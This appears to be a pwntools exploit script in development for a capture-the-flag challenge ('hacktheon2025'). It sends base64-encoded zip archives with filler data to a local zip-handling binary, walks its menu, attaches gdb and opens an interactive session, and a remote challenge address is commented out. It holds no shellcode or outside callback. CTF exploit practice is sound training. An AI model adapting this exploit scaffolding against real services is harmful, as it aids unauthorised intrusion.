from pwn import *
import io
import zipfile
import base64

context.log_level = 'debug'
context.terminal = ["tmux", "split", "-v", '-p', '100']
rem = process("./zip/problem/zip")
# rem = remote("hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com", 22193)

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
    zip_file.writestr('A', 'AAAAAAAAAAAAAAAAA')
zip_buffer.seek(0)
payload = base64.b64encode(zip_buffer.read())

rem.sendlineafter(b">> ", payload)
rem.sendlineafter(b">> ", b"1")
rem.sendlineafter(b">> ", b"2")
rem.sendlineafter(b">> ", b"0")
gdb.attach(rem)

with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
    zip_file.writestr('B', 'B')
    zip_file.writestr('C', 'CCCCCCCC')
zip_buffer.seek(0)
payload = base64.b64encode(zip_buffer.read())
rem.sendlineafter(b">> ", payload)

rem.interactive()